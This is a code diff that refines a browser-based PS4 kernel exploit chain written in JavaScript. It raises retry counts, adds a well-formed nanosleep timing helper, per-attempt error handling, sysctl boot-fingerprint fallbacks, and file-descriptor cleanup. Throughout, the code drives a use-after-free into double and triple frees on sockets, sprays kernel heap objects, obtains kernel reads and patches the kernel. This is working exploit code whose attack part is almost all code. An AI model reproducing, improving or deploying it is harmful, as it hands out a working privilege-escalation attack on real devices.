@@ -168,14 +168,15 @@ let allDone = false;
     let p = null;
     try {
         const NUM_IOV_WORKER = params.has("iov") ? parseInt(params.get("iov"), 10) : 6;
-        const NUM_ATTEMPT = params.has("attempts") ? parseInt(params.get("attempts"), 10) : 12;
+        const NUM_ATTEMPT = params.has("attempts") ? parseInt(params.get("attempts"), 10) : 24;
         const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x200;
+        const MS_DELAY = params.has("msdelay") ? parseInt(params.get("msdelay"), 10) : 1;
         const { key, off } = offsetsFor(navigator.userAgent);
         mark("FW", key || "(not a PS4 UA)");
         if (!off) { state("no offsets for this firmware", "bad"); return; }
         mark("FW-STATUS", off.fw_status || "none");
         mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
-            + " spray=" + NUM_IOV_SPRAY
+            + " spray=" + NUM_IOV_SPRAY + " msdelay=" + MS_DELAY
             + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
 
         tmDiag('fw_key', key);
@@ -183,6 +184,7 @@ let allDone = false;
         tmDiag('iov_workers', NUM_IOV_WORKER);
         tmDiag('attempts_max', NUM_ATTEMPT);
         tmDiag('spray', NUM_IOV_SPRAY);
+        tmDiag('ms_delay', MS_DELAY);
         tmDiag('stop_before_double', STOP_BEFORE_DOUBLE ? 1 : 0);
 
         let kpatch = null, payload = null;
@@ -441,8 +443,21 @@ let allDone = false;
         const scratch = bufAddr(scratchAb);
         const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
         const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
-        const lenAb = new ArrayBuffer(8); keepAlive.push(lenAb);
+        // *** FIX: lenAb de 0x10 para poder escribir tv_sec (0) + tv_nsec (8) ***
+        const lenAb = new ArrayBuffer(0x10); keepAlive.push(lenAb);
         const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);
+
+        // *** FIX: helper de nanosleep bien formado ***
+        function nanosleepMs(ms) {
+            const sec = Math.floor(ms / 1000);
+            const nsec = ((ms % 1000) * 1000000) >>> 0;
+            lenDv.setUint32(0, sec, true);
+            lenDv.setUint32(4, 0, true);
+            lenDv.setUint32(8, nsec, true);
+            lenDv.setUint32(12, 0, true);
+            return sc(SYS.nanosleep, lenAddr, 0).i32;
+        }
+
         const sprayAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(sprayAb);
         const sprayAddr = bufAddr(sprayAb), sprayDv = new DataView(sprayAb);
         const leakAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(leakAb);
@@ -478,7 +493,7 @@ let allDone = false;
         };
 
         function getRthdr(s, size, need) {
-            if (R2_ON) leakU8.fill(0xee, 0, size);
+            if (R2_ON) leakU8.fill(0xee, 0, Math.min(size, UCRED_SIZE));
             lenDv.setUint32(0, size, true);
             const rv = sc(SYS.getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
                 leakAddr, lenAddr).i32;
@@ -539,8 +554,13 @@ let allDone = false;
             if (s === -1) break;
             ipv6.push(s);
         }
-        check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK,
+        const reclaimOk = check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK,
             ipv6.length + "/" + NUM_IPV6_SOCK);
+        if (!reclaimOk) {
+            mark("RECLAIM-DEGRADED", "only " + ipv6.length + " AF_INET6 sockets "
+                + "-- the run continues but triple-free is likely to fail. "
+                + "reboot the console if this is the second run in a row.");
+        }
 
         tmDiag('ipv6_socks', ipv6.length);
 
@@ -755,7 +775,7 @@ let allDone = false;
                 if (result) return result;
                 backoff++;
                 rounds = Math.min(rounds * 2, 2000);
-                sc(SYS.nanosleep, lenAddr, 0);
+                nanosleepMs(1);
             }
             return null;
         }
@@ -799,19 +819,32 @@ let allDone = false;
             const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
             const nameDv = new DataView(nameAb);
             new Uint8Array(outAb).fill(0);
-            nameDv.setUint32(0, 1, true);
-            nameDv.setUint32(4, 21, true);
-            lenDv.setUint32(0, 0x10, true);
-            lenDv.setUint32(4, 0, true);
-            const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
-            const gotLen = lenDv.getUint32(0, true);
-            const o = new DataView(outAb);
-            const sec = o.getUint32(0, true);
-            if (rv !== 0 || sec === 0) {
-                bootErr = "rv=" + rv + " errno=" + errno() + " oldlen=" + gotLen;
-                return null;
+            // Try kern.boottime (1,21), then kern.ident (1,10), then kern.osreldate (1,11)
+            const trials = [[1, 21], [1, 10], [1, 11]];
+            for (const t of trials) {
+                nameDv.setUint32(0, t[0], true);
+                nameDv.setUint32(4, t[1], true);
+                lenDv.setUint32(0, 0x10, true);
+                lenDv.setUint32(4, 0, true);
+                const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
+                const gotLen = lenDv.getUint32(0, true);
+                if (rv === 0 && gotLen > 0) {
+                    const o = new DataView(outAb);
+                    const sec = o.getUint32(0, true);
+                    if (sec !== 0) {
+                        return t[0] + "," + t[1] + ":" + sec.toString(16)
+                            + ":" + o.getUint32(8, true).toString(16);
+                    }
+                    // Different shape (e.g. osreldate): hash the first 8 bytes
+                    let h = 0;
+                    for (let i = 0; i < 8; ++i)
+                        h = ((h << 8) ^ o.getUint8(i)) >>> 0;
+                    return t[0] + "," + t[1] + ":h" + h.toString(16);
+                }
+                bootErr = "t=" + t[0] + "," + t[1] + " rv=" + rv
+                    + " errno=" + errno() + " oldlen=" + gotLen;
             }
-            return sec.toString(16) + ":" + o.getUint32(8, true).toString(16);
+            return null;
         }
         const boot = bootFingerprint();
         mark("BOOT", boot || bootErr);
@@ -842,151 +875,175 @@ let allDone = false;
             }
             state("attempt " + attempt + "...", "warn");
             mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
-
-            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
-            if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
-            const reg = netevent(dummy, NETEVENT_SET_QUEUE);
-            if (reg.rv === -1) {
-                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
-                sc(SYS.close, dummy); continue;
-            }
-
-            sc(SYS.close, dummy);
-            sc(SYS.setuid, 1);
-            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
-            if (uafSock !== dummy) {
-                mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
-                    + " got " + uafSock);
-                if (uafSock !== -1) sc(SYS.close, uafSock);
-                uafSock = 0;
-                continue;
-            }
-            sc(SYS.setuid, 1);
-            const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
-            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
-            committed = true;
-
-            try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
-            catch (e) { }
-
-            for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);
-
-            if (STOP_BEFORE_DOUBLE) {
-                mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
-                rebootRequired = true;
-                break;
-            }
-
-            const d1 = sc(SYS.dup, uafSock).i32;
-            if (d1 === -1) { mark("ATTEMPT-SKIP", "dup failed"); rebootRequired = true; continue; }
-            lenDv.setUint32(8, 1000, true);
-            sc(SYS.nanosleep, lenAddr, 0);
-            sc(SYS.close, d1);
-            rebootRequired = true;
-            mark("DOUBLE-FREE", "dup=" + d1 + " closed");
-
-            twins = findTwins(MAX_ROUNDS_TWIN);
-            if (!twins) {
-                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
-                mark("ATTEMPT-RETRY", "after=no-twins next="
-                    + (attempt + 1) + "/" + NUM_ATTEMPT);
-                continue;
-            }
-            mark("TWINS", "a=" + twins.a + " b=" + twins.b
-                + " round=" + twins.round);
-
-            tmDiag('twins_a', twins.a);
-            tmDiag('twins_b', twins.b);
-            tmDiag('twins_round', twins.round);
-
-            freeRthdr(twins.b);
-            let reclaimed = false, rounds = 0;
-
-            function fireTracked(w) {
-                const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
-                t.settled = false;
-                t.then(() => { t.settled = true; }, () => { t.settled = true; });
-                return t;
-            }
-            const tasks = new Array(iovWorkers.length);
-            let parkedSeen = -1;
-            for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
-                rounds = i + 1;
-                for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
-                sc(SYS.sched_yield);
-                if (parkedSeen < 0) {
-                    await new Promise(r => setTimeout(r, 0));
-                    parkedSeen = tasks.filter(t => !t.settled).length;
-                    mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
+            // *** FIX: try/catch por intento ***
+            try {
+                const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
+                if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
+                const reg = netevent(dummy, NETEVENT_SET_QUEUE);
+                if (reg.rv === -1) {
+                    mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
+                    sc(SYS.close, dummy); continue;
                 }
-                if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0
-                    && leakDv.getInt32(0, true) === 1) { reclaimed = true; break; }
+
+                sc(SYS.close, dummy);
+                sc(SYS.setuid, 1);
+                uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
+                if (uafSock !== dummy) {
+                    mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
+                        + " got " + uafSock);
+                    if (uafSock !== -1) sc(SYS.close, uafSock);
+                    uafSock = 0;
+                    continue;
+                }
+                sc(SYS.setuid, 1);
+                const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
+                mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
+                committed = true;
+
+                try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
+                catch (e) { }
+
+                for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);
+
+                if (STOP_BEFORE_DOUBLE) {
+                    mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
+                    rebootRequired = true;
+                    break;
+                }
+
+                const d1 = sc(SYS.dup, uafSock).i32;
+                if (d1 === -1) { mark("ATTEMPT-SKIP", "dup failed"); rebootRequired = true; continue; }
+                // *** FIX: nanosleep con timespec bien formado ***
+                nanosleepMs(MS_DELAY);
+                sc(SYS.close, d1);
+                rebootRequired = true;
+                mark("DOUBLE-FREE", "dup=" + d1 + " closed");
+
+                twins = findTwins(MAX_ROUNDS_TWIN);
+                if (!twins) {
+                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
+                    mark("ATTEMPT-RETRY", "after=no-twins next="
+                        + (attempt + 1) + "/" + NUM_ATTEMPT);
+                    continue;
+                }
+                mark("TWINS", "a=" + twins.a + " b=" + twins.b
+                    + " round=" + twins.round);
+
+                tmDiag('twins_a', twins.a);
+                tmDiag('twins_b', twins.b);
+                tmDiag('twins_round', twins.round);
+
+                freeRthdr(twins.b);
+                let reclaimed = false, rounds = 0;
+
+                function fireTracked(w) {
+                    const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
+                    t.settled = false;
+                    t.then(() => { t.settled = true; }, () => { t.settled = true; });
+                    return t;
+                }
+                const tasks = new Array(iovWorkers.length);
+                let parkedSeen = -1;
+                for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
+                    rounds = i + 1;
+                    for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
+                    sc(SYS.sched_yield);
+                    if (parkedSeen < 0) {
+                        await new Promise(r => setTimeout(r, 0));
+                        parkedSeen = tasks.filter(t => !t.settled).length;
+                        mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
+                    }
+                    if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0
+                        && leakDv.getInt32(0, true) === 1) { reclaimed = true; break; }
+
+                    for (let k = 0; k < iovWorkers.length; ++k)
+                        sc(SYS.write, iovSs[1], scratch, 1);
+                    await Promise.all(tasks);
+                    for (let k = 0; k < iovWorkers.length; ++k)
+                        sc(SYS.read, iovSs[0], scratch, 1);
+                }
+                const rets = tasks.map(function (t, k) {
+                    return iovWorkers[k].ctx.frameDv.getInt32(0, true);
+                });
+                mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
+                check("cr_refcnt-driven-1", reclaimed,
+                    "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
+
+                tmDiag('iov_reclaim_rounds', rounds);
+                tmDiag('iov_parked', parkedSeen);
+
+                if (!reclaimed) {
+                    for (let k = 0; k < iovWorkers.length; ++k)
+                        sc(SYS.write, iovSs[1], scratch, 1);
+                    await Promise.all(tasks);
+                    for (let k = 0; k < iovWorkers.length; ++k)
+                        sc(SYS.read, iovSs[0], scratch, 1);
+                    burn(twins.a, "refcount-drive");
+                    burn(twins.b, "refcount-drive");
+                    twins = null;
+                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
+                    mark("ATTEMPT-RETRY", "after=refcount-drive burned="
+                        + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
+                    continue;
+                }
+
+                const d2 = sc(SYS.dup, uafSock).i32;
+                if (d2 === -1) { mark("ATTEMPT-SKIP", "second dup failed"); break; }
+                sc(SYS.close, d2);
+                mark("TRIPLE-FREE", "dup=" + d2 + " closed");
+
+                const t0 = twins.a;
+                const ptOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
+                mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b
+                    + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail")
+                    + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
+                const t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);
 
                 for (let k = 0; k < iovWorkers.length; ++k)
                     sc(SYS.write, iovSs[1], scratch, 1);
                 await Promise.all(tasks);
                 for (let k = 0; k < iovWorkers.length; ++k)
                     sc(SYS.read, iovSs[0], scratch, 1);
-            }
-            const rets = tasks.map(function (t, k) {
-                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
-            });
-            mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
-            check("cr_refcnt-driven-1", reclaimed,
-                "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
+                const rets2 = tasks.map(function (t, k) {
+                    return iovWorkers[k].ctx.frameDv.getInt32(0, true);
+                });
+                const irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
+                mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",")
+                    + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));
 
-            tmDiag('iov_reclaim_rounds', rounds);
-            tmDiag('iov_parked', parkedSeen);
-
-            if (!reclaimed) {
-                for (let k = 0; k < iovWorkers.length; ++k)
-                    sc(SYS.write, iovSs[1], scratch, 1);
-                await Promise.all(tasks);
-                for (let k = 0; k < iovWorkers.length; ++k)
-                    sc(SYS.read, iovSs[0], scratch, 1);
-                burn(twins.a, "refcount-drive");
-                burn(twins.b, "refcount-drive");
+                const t2 = findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
+                if (t1 && t2) {
+                    triplets = [t0, t1, t2];
+                    mark("TRIPLETS", triplets.join(","));
+                } else {
+                    mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
+                    burn(t0, "triplet-miss");
+                    if (t1) burn(t1, "triplet-miss");
+                    if (twins && twins.b) burn(twins.b, "triplet-miss");
+                    uncontained = "triplet-miss";
+                }
+            } catch (attemptErr) {
+                mark("ATTEMPT-THREW", "attempt=" + attempt + " "
+                    + (attemptErr && attemptErr.message
+                        ? attemptErr.message : String(attemptErr)));
+                try {
+                    if (window.__TM) {
+                        window.__TM.errors.push({
+                            ts: Date.now() - window.__TM.startedAt,
+                            message: 'ATTEMPT-THREW #' + attempt + ': '
+                                + (attemptErr && attemptErr.message
+                                    ? attemptErr.message : String(attemptErr)),
+                            file: 'chain_poops.js', line: 0, col: 0,
+                            stack: attemptErr && attemptErr.stack
+                                ? String(attemptErr.stack).slice(0, 400) : ''
+                        });
+                        if (window.__TM.render) window.__TM.render();
+                    }
+                } catch (_) { }
+                // Continuar al siguiente intento en vez de abortar
                 twins = null;
-                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
-                mark("ATTEMPT-RETRY", "after=refcount-drive burned="
-                    + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
+                if (uafSock > 0) { try { sc(SYS.close, uafSock); } catch (_) { } uafSock = 0; }
                 continue;
-            }
-
-            const d2 = sc(SYS.dup, uafSock).i32;
-            if (d2 === -1) { mark("ATTEMPT-SKIP", "second dup failed"); break; }
-            sc(SYS.close, d2);
-            mark("TRIPLE-FREE", "dup=" + d2 + " closed");
-
-            const t0 = twins.a;
-            const ptOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
-            mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b
-                + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail")
-                + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
-            const t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);
-
-            for (let k = 0; k < iovWorkers.length; ++k)
-                sc(SYS.write, iovSs[1], scratch, 1);
-            await Promise.all(tasks);
-            for (let k = 0; k < iovWorkers.length; ++k)
-                sc(SYS.read, iovSs[0], scratch, 1);
-            const rets2 = tasks.map(function (t, k) {
-                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
-            });
-            const irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
-            mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",")
-                + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));
-
-            const t2 = findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
-            if (t1 && t2) {
-                triplets = [t0, t1, t2];
-                mark("TRIPLETS", triplets.join(","));
-            } else {
-                mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
-                burn(t0, "triplet-miss");
-                if (t1) burn(t1, "triplet-miss");
-                if (twins && twins.b) burn(twins.b, "triplet-miss");
-                uncontained = "triplet-miss";
             }
         }
 
@@ -1428,7 +1485,7 @@ let allDone = false;
             const fdtOfiles = await kread8(kqFdp);
             mark("FDT-OFILES", "" + fdtOfiles);
 
-            tmDiag('fdt_ofiles', fdtOfiles.toString());
+            tmDiag('fdt_ofiles', fdtOfiles ? fdtOfiles.toString() : 'null');
 
             let mFp = null, sFp = null;
             const fdDelta = slavePipe[0] - masterPipe[0];
@@ -1561,9 +1618,6 @@ let allDone = false;
 
                     const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
                     const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
-                    const dmpAb = new ArrayBuffer(0x20); keepAlive.push(dmpAb);
-                    const dmpAddr = bufAddr(dmpAb), dmpDv = new DataView(dmpAb);
-                    const dmpU8 = new Uint8Array(dmpAb);
                     const scanAbDump = new ArrayBuffer(0x80 * FILEDESCENT_SIZE);
                     keepAlive.push(scanAbDump);
                     const scanAddrDump = bufAddr(scanAbDump);
@@ -1735,7 +1789,7 @@ let allDone = false;
                                     ? "nulled" : "already0";
                             }
                             attempts++;
-                            sc(SYS.nanosleep, lenAddr, 0);
+                            nanosleepMs(1);
                         }
                         mark("RTHDR-NULL-FAILED", "fd=" + fd + " opts=" + opts
                             + " after 3 attempts");
@@ -2212,6 +2266,26 @@ let allDone = false;
         } catch (_) { }
     } finally {
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
+
+        // *** FIX: cierre de emergencia de todos los FDs que quedaron vivos ***
+        try {
+            if (sc) {
+                const closeAll = (list, tag) => {
+                    let n = 0;
+                    for (const fd of list) {
+                        if (typeof fd !== "number" || fd <= 2) continue;
+                        try { if (sc(SYS.close, fd).i32 === 0) n++; } catch (_) { }
+                    }
+                    if (n) mark(tag, "closed=" + n);
+                };
+                try { if (typeof ipv6 !== "undefined") closeAll(ipv6, "IPV6-CLOSED-FALLBACK"); } catch (_) { }
+                try { if (typeof iovSs !== "undefined") closeAll(iovSs, "IOVSS-CLOSED-FALLBACK"); } catch (_) { }
+                try { if (typeof uioSs !== "undefined") closeAll(uioSs, "UIOSS-CLOSED-FALLBACK"); } catch (_) { }
+                try { if (typeof masterPipe !== "undefined") closeAll([masterPipe[0], masterPipe[1]], "MPIPE-CLOSED-FALLBACK"); } catch (_) { }
+                try { if (typeof slavePipe !== "undefined") closeAll([slavePipe[0], slavePipe[1]], "SPIPE-CLOSED-FALLBACK"); } catch (_) { }
+                try { if (uafSock) { sc(SYS.close, uafSock); uafSock = 0; } } catch (_) { }
+            }
+        } catch (e) { mark("FD-CLEANUP-FAILED", e.message); }
 
         try {
             if (restoreCtx) await restoreCtx.restore("finally");
